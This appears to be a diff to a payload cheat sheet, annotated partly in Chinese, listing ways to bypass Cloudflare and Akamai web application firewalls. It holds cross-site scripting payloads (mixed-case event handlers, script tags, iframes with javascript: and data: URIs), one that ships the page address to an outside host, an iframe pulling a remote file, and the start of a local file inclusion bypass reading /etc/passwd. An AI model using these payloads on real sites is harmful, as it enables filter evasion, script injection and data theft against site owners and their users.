@@ -29,7 +29,18 @@ Cloudfalre XSS Bypass
 "><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 Akamai XSS WAF Bypass
 "><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
-
+"OnMoUsEoVeR=prompt(1)//     表单
+"-prompt(1)-"   URL删除参数
+"><iMg SrC=1 oNeRrOr=prompt(1)>  URL删除参数
+"><script>prompt(6666)</script>
+<script>alert(a)</script>
+反射型事件'onfocus=alert(1)//
+存储型index.php?c=mail&m=test
+</p>"<iframe οnlοad="prompt(1)"></iframe>
+</p>"<iframe src=""><a href="javascript:alert(1)">Click</a></iframe>
+</p>"<iframe src="javascript:alert(1)">test</iframe>
+</p>"<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+</p>"<iframe src="//xxx.cc/xxx/test.jpg"></iframe>
 
 本地文件包含 WAF (Cloudflare) bypass
 ../../etc/passwd = 403 Forbidden
